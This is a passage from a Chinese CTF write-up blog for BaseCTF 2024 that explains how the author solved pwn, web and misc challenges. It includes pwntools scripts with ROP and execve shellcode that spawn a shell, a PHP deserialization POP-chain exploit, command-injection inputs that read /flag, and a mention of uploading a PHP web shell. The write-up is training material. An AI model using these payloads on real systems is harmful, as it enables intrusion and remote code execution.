</span></span><span style=display:flex><span><span style=color:#75715e># 尝试使用 echo 和 bash 的 &lt; 操作符读取文件</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;echo $(&lt;/flag)&#39;</span>)
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>print(response<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 关闭连接</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>close()
</span></span></code></pre></div><h3 id=我把她丢了>我把她丢了</h3><p>填充使其溢出调用到bin/sh,就可以了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;challenge.basectf.fun&#34;</span>, <span style=color:#ae81ff>49516</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#system_plt=elf.plt[&#34;system&#34;]</span>
</span></span><span style=display:flex><span>pop_rdi_ret<span style=color:#f92672>=</span><span style=color:#ae81ff>0x0000000000401196</span>
</span></span><span style=display:flex><span>main<span style=color:#f92672>=</span><span style=color:#ae81ff>0x000000000040124B</span>
</span></span><span style=display:flex><span>payload<span style=color:#f92672>=</span><span style=color:#ae81ff>0x78</span><span style=color:#f92672>*</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>+</span>p64(pop_rdi_ret)<span style=color:#f92672>+</span>p64(<span style=color:#ae81ff>0x0000000000402008</span>)<span style=color:#f92672>+</span>p64(<span style=color:#ae81ff>0x000000000040120F</span>)<span style=color:#f92672>+</span>p64(main)
</span></span><span style=display:flex><span><span style=color:#75715e>#寄存器地址-&gt;bin/sh调用到system最后进入main</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 进入交互模式</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><h3 id=re2text>Re2text</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 连接到远程服务</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;challenge.basectf.fun&#34;</span>, <span style=color:#ae81ff>30147</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 构造 payload</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x28</span><span style=color:#f92672>+</span>p64(<span style=color:#ae81ff>0x40101A</span>)<span style=color:#f92672>+</span>p64(<span style=color:#ae81ff>0x4011a4</span>)           <span style=color:#75715e># 填充缓冲区</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 发送 payload</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 进入交互模式</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><h3 id=shellcode_level0>shellcode_level0</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 连接到远程服务</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;challenge.basectf.fun&#39;</span>, <span style=color:#ae81ff>49846</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Shellcode 是一段二进制代码，可以直接在内存中执行。这个 shellcode 会启动一个 /bin/sh shell。</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>=</span> (
</span></span><span style=display:flex><span>    <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\x31\xc0</span><span style=color:#e6db74>&#34;</span>            <span style=color:#75715e># xor rax, rax        ; 清空 rax 寄存器 (rax = 0)</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x50</span><span style=color:#e6db74>&#34;</span>                    <span style=color:#75715e># push rax            ; 将 rax (0) 压入栈，作为 NULL 终止符</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># mov rbx, 0x68732f2f6e69622f ; 将 &#34;/bin//sh&#34; 存入 rbx</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x53</span><span style=color:#e6db74>&#34;</span>                    <span style=color:#75715e># push rbx            ; 将 rbx (&#34;/bin//sh&#34;) 压入栈</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\x89\xe7</span><span style=color:#e6db74>&#34;</span>            <span style=color:#75715e># mov rdi, rsp        ; 将栈指针 rsp 的值赋给 rdi，现在 rdi 指向 &#34;/bin//sh&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\x31\xf6</span><span style=color:#e6db74>&#34;</span>            <span style=color:#75715e># xor rsi, rsi        ; 清空 rsi 寄存器 (rsi = 0)，表示 NULL</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\x31\xd2</span><span style=color:#e6db74>&#34;</span>            <span style=color:#75715e># xor rdx, rdx        ; 清空 rdx 寄存器 (rdx = 0)，表示 NULL</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\x31\xc0</span><span style=color:#e6db74>&#34;</span>            <span style=color:#75715e># xor rax, rax        ; 清空 rax 寄存器 (rax = 0)</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xb0\x3b</span><span style=color:#e6db74>&#34;</span>                <span style=color:#75715e># mov al, 0x3b        ; 将 0x3b (59) 赋给 al 寄存器，59 是 execve 的系统调用号</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x0f\x05</span><span style=color:#e6db74>&#34;</span>                <span style=color:#75715e># syscall             ; 触发系统调用，执行 execve(&#34;/bin/sh&#34;, NULL, NULL)</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(shellcode)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><h2 id=web>web</h2><h3 id=http-是什么呀>HTTP 是什么呀</h3><p>?basectf=we1c%2500me</p><p>Base=fl@g</p><p><img alt=http1 loading=lazy src=/posts/ctf/basectf2024/http1.png></p><p><img alt=http2 loading=lazy src=/posts/ctf/basectf2024/http2.png></p><p><img alt=http3 loading=lazy src=/posts/ctf/basectf2024/http3.png></p><p>base解密得到flag</p><h3 id=喵喵喵ﻌ>喵喵喵´•ﻌ•`</h3><p><img alt=喵喵喵 loading=lazy src=/posts/ctf/basectf2024/%E5%96%B5%E5%96%B5%E5%96%B5.png></p><h3 id=md5绕过欸>md5绕过欸</h3><p><img alt=md5 loading=lazy src=/posts/ctf/basectf2024/md5.png></p><h3 id=a-dark-room>A Dark Room</h3><p>直接查看源码得到flag</p><h3 id=upload>upload</h3><p>上传一句话木马，观看源码在uploads/，直接上传php即可</p><h3 id=aura-酱的礼物>Aura 酱的礼物</h3><p>混了个二血😋</p><p>前两个一个是php伪协议，一个直接输入</p><p>第三个</p><p>我是用的是@进行重定向，然后用我自己的vps开个端口进行拼接就行（理论上不需要这么复杂，只是最先想到这个办法</p><p><img alt=aura loading=lazy src=/posts/ctf/basectf2024/aura.png></p><p>最后进行伪协议读取flag</p><p>// flag{c985afc7-50f1-44e5-87f0-221d081b9459} Aura 酱有拿到一血吗？</p><h2 id=misc>Misc</h2><h3 id=你也喜欢圣物吗>你也喜欢圣物吗</h3><p>打开下来先用010打开图片看，底部有个base64的编码</p><p>提示去看LSB</p><p>利用stegsolve进行分析，得到key</p><p>解开第一层压缩包</p><p>第二层伪加密工具进行解密，打开进去滑到下面有个真的flag</p><h3 id=根本进不去啊>根本进不去啊!</h3><p><img alt=进不去 loading=lazy src=/posts/ctf/basectf2024/%E8%BF%9B%E4%B8%8D%E5%8E%BB.png></p><p>dig的命令是进行域信息搜索器，找txt得到flag</p><h3 id=海上遇到了鲨鱼>海上遇到了鲨鱼</h3><p>利用wireshark打开，http找到php,里面有flag,进行简单的反转得到flag</p><h3 id=正着看还是反着看呢>正着看还是反着看呢？</h3><p>利用python读取图片文件，然后反转图片进行逆向</p><p>将文件拖到虚拟机，进行foremost，里面有压缩包解压得到flag</p><h3 id=base>Base</h3><p>直接64，32进行解密</p><h3 id=签到dk-盾>签到！DK 盾！</h3><p>直接公众号发送就行</p><h3 id=人生苦短我用python>人生苦短，我用Python</h3><p>其他部分都可以看着推，我这边放一下<strong>推算15</strong>的情况</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> itertools
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 目标值</span>
</span></span><span style=display:flex><span>target_value <span style=color:#f92672>=</span> <span style=color:#ae81ff>41378751114180610</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 我们已知的 flag 结构</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;BaseCTF</span><span style=color:#e6db74>{s1Mpl3_1s_l1Tt3r_Th4n_C0mPl3x}</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 定义我们将尝试的字符集</span>
</span></span><span style=display:flex><span>charset <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 计算函数</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>calculate_sum</span>(chars):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> sum(ord(c) <span style=color:#f92672>*</span> <span style=color:#ae81ff>2024_08_15</span> <span style=color:#f92672>**</span> idx <span style=color:#66d9ef>for</span> idx, c <span style=color:#f92672>in</span> enumerate(chars))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 生成所有可能的组合并测试</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> combo <span style=color:#f92672>in</span> itertools<span style=color:#f92672>.</span>product(charset, repeat<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span>):
</span></span><span style=display:flex><span>    candidate <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(combo)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> calculate_sum(candidate) <span style=color:#f92672>==</span> target_value:
</span></span><span style=display:flex><span>        <span style=color:#75715e># 找到符合条件的组合，更新 flag</span>
</span></span><span style=display:flex><span>        flag <span style=color:#f92672>=</span> flag[:<span style=color:#ae81ff>17</span>] <span style=color:#f92672>+</span> candidate <span style=color:#f92672>+</span> flag[<span style=color:#ae81ff>20</span>:]
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Found correct sequence: </span><span style=color:#e6db74>{</span>candidate<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Correct flag: </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;No valid sequence found.&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#75715e>#得到flagimport itertools</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 目标值</span>
</span></span><span style=display:flex><span>target_value <span style=color:#f92672>=</span> <span style=color:#ae81ff>41378751114180610</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 我们已知的 flag 结构</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;BaseCTF</span><span style=color:#e6db74>{s1Mpl3_1s_l1Tt3r_Th4n_C0mPl3x}</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 定义我们将尝试的字符集</span>
</span></span><span style=display:flex><span>charset <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 计算函数</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>calculate_sum</span>(chars):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> sum(ord(c) <span style=color:#f92672>*</span> <span style=color:#ae81ff>2024_08_15</span> <span style=color:#f92672>**</span> idx <span style=color:#66d9ef>for</span> idx, c <span style=color:#f92672>in</span> enumerate(chars))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 生成所有可能的组合并测试</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> combo <span style=color:#f92672>in</span> itertools<span style=color:#f92672>.</span>product(charset, repeat<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span>):
</span></span><span style=display:flex><span>    candidate <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(combo)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> calculate_sum(candidate) <span style=color:#f92672>==</span> target_value:
</span></span><span style=display:flex><span>        <span style=color:#75715e># 找到符合条件的组合，更新 flag</span>
</span></span><span style=display:flex><span>        flag <span style=color:#f92672>=</span> flag[:<span style=color:#ae81ff>17</span>] <span style=color:#f92672>+</span> candidate <span style=color:#f92672>+</span> flag[<span style=color:#ae81ff>20</span>:]
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Found correct sequence: </span><span style=color:#e6db74>{</span>candidate<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Correct flag: </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;No valid sequence found.&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#75715e>#BaseCTF{s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x}</span>
</span></span></code></pre></div><h3 id=倒计时海报>倒计时？海报！</h3><p>配合stegsolve即可正确食用，一开始一直没写听说废眼，真正做的话十分钟以内估计就解决了附上各个对应的截图</p><img src=haibao1.png alt=haibao1 style=zoom:50%>
<img src=haibao2.png alt=haibao2 style=zoom:50%>
<img src=haibao3.png alt=haibao3 style=zoom:50%>
<img src=haibao4.png alt=haibao4 style=zoom:50%>
<img src=haibao5.png alt=haibao1 style=zoom:50%>
<img src=.haibao6.png alt=haibao1 style=zoom:50%>
<img src=haibao7.png alt=haibao1 style=zoom:50%>
<img src=haibao8.png alt=haibao1 style=zoom:50%>
<img src=haibao9.png alt=haibao1 style=zoom:50%>
<img src=haibao10.png alt=haibao10 style=zoom:50%><p><strong>BaseCTF{c0unt_d0wn_fro3_X_every_d@y_i5_re@11y_c0o1_@nd_h@rd_t0_do_1t_ev3ry_n1ght}</strong></p><h3 id=喵喵太可爱了>喵喵太可爱了</h3><p>跟着幸运儿拿的flag</p><p><strong>BaseCTF{m1a0_mi@o_1s_n0t_a_b3tr4yer_t0_t3l1_the_f1ag}</strong></p><h1 id=week2以后只写web了orz>week2(以后只写web了，orz)</h1><h2 id=web-1>web</h2><h3 id=ez_ser>ez_ser</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>re</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $chu0;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__toString</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>chu0</span>)){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;I can not believes!&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>chu0</span><span style=color:#f92672>-&gt;</span>$nononono;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>web</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $kw;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $dt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__wakeup</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;lalalla&#34;</span><span style=color:#f92672>.</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>kw</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;ALL Done!&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>pwn</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $dusk;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $over;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__get</span>($name) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>dusk</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;gods&#34;</span>){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;什么，你竟敢不认可?&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>over</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>getflag</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Misc</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $nothing;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $flag;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getflag</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>eval</span>(<span style=color:#e6db74>&#34;system(&#39;cat /flag&#39;);&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Crypto</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__wakeup</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;happy happy happy!&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getflag</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;you are over!&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$ser <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;ser&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#a6e22e>unserialize</span>($ser);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>构造exp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$exp <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>web</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>kw</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>re</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>kw</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>chu0</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>pwn</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>kw</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>chu0</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>over</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Misc</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>serialize</span>($exp));
</span></span></code></pre></div><h3 id=一起吃豆豆>一起吃豆豆</h3><p>不能直接f12，可以用浏览器的开发者工具打开f12，看js代码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>context</span>.<span style=color:#a6e22e>fillText</span>(<span style=color:#a6e22e>_LIFE</span> <span style=color:#f92672>?</span> <span style=color:#a6e22e>atob</span>(<span style=color:#e6db74>&#34;QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ==&#34;</span>) <span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;GAME OVER&#39;</span>, <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>x</span>, <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>y</span>);
</span></span></code></pre></div><p>base64解一下就出来了</p><h3 id=happy-birthday>Happy Birthday</h3><p>尝试了一下发现要传pdf格式并且需要文件相同，可以参考我php绕过那篇文章，利用fastcoll.exe生成两个文件，得到flag</p><h3 id=你听不到我的声音>你听不到我的声音</h3><p>这题考察的是这个函数没有直接的回显，可以重定向，利用>得到flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cmd<span style=color:#f92672>=</span>cat /flag&gt;1.txt
</span></span></code></pre></div><h3 id=really-ez-pop>Really EZ POP</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Sink</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $cmd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;echo 123;&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__toString</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>eval</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cmd</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Shark</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $word <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Hello, World!&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__invoke</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Shark says:&#39;</span> <span style=color:#f92672>.</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>word</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Sea</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $animal;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__get</span>($name)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $sea_ani <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>animal</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;In a deep deep sea, there is a &#39;</span> <span style=color:#f92672>.</span> $sea_ani();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Nature</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $sea;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>()
</span></span><span style=display:flex><span>    {
